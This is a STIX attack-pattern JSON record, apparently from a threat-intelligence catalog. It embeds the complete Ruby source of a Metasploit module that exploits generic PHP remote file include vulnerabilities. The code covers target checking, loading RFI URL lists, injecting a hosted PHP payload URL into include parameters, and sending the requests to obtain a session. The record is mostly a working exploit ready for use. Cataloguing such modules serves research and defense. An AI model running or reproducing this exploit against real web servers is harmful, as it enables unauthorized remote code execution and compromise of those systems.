{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a7131f4c-29ab-4c79-bbb3-2a946e51fc92",
    "created": "2024-08-14T17:14:02.941075Z",
    "modified": "2024-08-14T17:14:02.941079Z",
    "name": "PHP Remote File Include Generic Code Execution",
    "description": " This module can be used to exploit any generic PHP file include vulnerability where the application includes code like the following:  <?php include($_GET['path']); ?> ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/php_include.rb",
            "external_id": "php_include.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::PHPInclude\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t => 'PHP Remote File Include Generic Code Execution',\n      'Description'\t => %q{\n          This module can be used to exploit any generic PHP file include vulnerability,\n        where the application includes code like the following:\n\n        <?php include($_GET['path']); ?>\n      },\n      'Author'\t\t => [ 'hdm' , 'egypt', 'ethicalhack3r' ],\n      'License'\t\t => MSF_LICENSE,\n      #'References'\t=> [ ],\n      'Privileged'\t => false,\n      'Payload'\t\t =>\n        {\n          'DisableNops' => true,\n          'Compat'\t\t=>\n            {\n              'ConnectionType' => 'find',\n            },\n          # Arbitrary big number. The payload gets sent as an HTTP\n          # response body, so really it's unlimited\n          'Space'\t=> 262144, # 256k\n        },\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 30\n        },\n      'DisclosureDate' => '2006-12-17',\n      'Platform'\t => 'php',\n      'Arch'\t\t => ARCH_PHP,\n      'Targets'\t\t => [[ 'Automatic', { }]],\n      'DefaultTarget' => 0))\n\n    register_options([\n      OptString.new('PATH', [ true , \"The base directory to prepend to the URL to try\", '/']),\n      OptString.new('PHPURI', [false, \"The URI to request, with the include parameter changed to XXpathXX\"]),\n      OptString.new('POSTDATA', [false, \"The POST data to send, with the include parameter changed to XXpathXX\"]),\n      OptString.new('HEADERS', [false, \"Any additional HTTP headers to send, cookies for example. Format: \\\"header:value,header2:value2\\\"\"]),\n      OptPath.new('PHPRFIDB', [false, \"A local file containing a list of URLs to try, with XXpathXX replacing the URL\",\n        File.join(Msf::Config.data_directory, \"exploits\", \"php\", \"rfi-locations.dat\")\n        ])\n      ])\n  end\n\n    def check\n        uri = datastore['PHPURI'] ? datastore['PHPURI'].dup : \"\"\n\n        tpath = normalize_uri(datastore['PATH'])\n        if tpath[-1,1] == '/'\n            tpath = tpath.chop\n        end\n\n        if(uri and ! uri.empty?)\n            uri.gsub!(/\\?.*/, \"\")\n            print_status(\"Checking uri #{rhost+tpath+uri}\")\n            response = send_request_raw({ 'uri' => tpath+uri})\n            return Exploit::CheckCode::Detected if response.code == 200\n            vprint_error(\"Server responded with #{response.code}\")\n            return Exploit::CheckCode::Safe\n        else\n            return Exploit::CheckCode::Unknown\n        end\n    end\n\n  def datastore_headers\n    headers = datastore['HEADERS'] ? datastore['HEADERS'].dup : \"\"\n    headers_hash = Hash.new\n    if (headers and ! headers.empty?)\n      headers.split(',').each do |header|\n        key,value = header.split(':')\n        headers_hash[key] = value.strip\n      end\n    end\n    headers_hash\n  end\n\n  def php_exploit\n    uris = []\n\n    tpath = normalize_uri(datastore['PATH'])\n    if tpath[-1,1] == '/'\n      tpath = tpath.chop\n    end\n\n    # PHPURI overrides the PHPRFIDB list\n    if (datastore['PHPURI'] and not datastore['PHPURI'].empty? and (datastore['POSTDATA'].nil? or datastore['POSTDATA'].empty?) )\n      uris << datastore['PHPURI'].strip.gsub('XXpathXX', Rex::Text.to_hex(php_include_url, \"%\"))\n      http_method = \"GET\"\n    elsif (datastore['POSTDATA'] and not datastore['POSTDATA'].empty?)\n      uris << datastore['PHPURI']\n      postdata = datastore['POSTDATA'].strip.gsub('XXpathXX', Rex::Text.to_hex(php_include_url, \"%\"))\n      http_method = \"POST\"\n    else\n      print_status(\"Loading RFI URLs from the database...\")\n      ::File.open(datastore['PHPRFIDB'], \"rb\") do |fd|\n        fd.read(fd.stat.size).split(/\\n/).each do |line|\n          line.strip!\n          next if line.empty?\n          next if line =~ /^#/\n          next if line !~ /^\\//\n\n          uris << line.gsub('XXpathXX',\n            Rex::Text.to_hex(php_include_url.sub(/\\?$/, '') + '?', \"%\") # ? append is required\n          )\n        end\n      end\n      uris.uniq!\n      print_status(\"Loaded #{uris.length} URLs\")\n      http_method = \"GET\"\n    end\n\n    # Very short timeout because the request may never return if we're\n    # sending a socket payload\n    timeout = 0.01\n\n    # We can't make this parallel without breaking PHP findsock\n    # Findsock payloads cause this loop to run slowly\n    uris.each do |uri|\n      break if session_created?\n\n      vprint_status(\"Sending: #{rhost+tpath+uri}\")\n      begin\n        if http_method == \"GET\"\n          response = send_request_raw( {\n            'global' => true,\n            'uri'\t => tpath+uri,\n            'headers' => datastore_headers,\n          }, timeout)\n        elsif http_method == \"POST\"\n          response = send_request_raw(\n            {\n              'global'\t=> true,\n              'uri'\t=> tpath+uri,\n              'method'\t=> http_method,\n              'data'\t=> postdata,\n              'headers' => datastore_headers.merge({\n                'Content-Type'\t => 'application/x-www-form-urlencoded',\n                'Content-Length' => postdata.length\n              })\n            }, timeout)\n        end\n        handler\n      rescue ::Interrupt\n        raise $!\n      rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\n        print_error(\"The target service unreachable\")\n        break\n      rescue ::OpenSSL::SSL::SSLError\n        print_error(\"The target failed to negotiate SSL, is this really an SSL service?\")\n        break\n      rescue ::Exception => e\n        print_error(\"Exception #{e.class} #{e}\")\n      end\n\n      Thread.pass\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-12-17",
    "x_mitre_platforms": [
        "php'"
    ]
}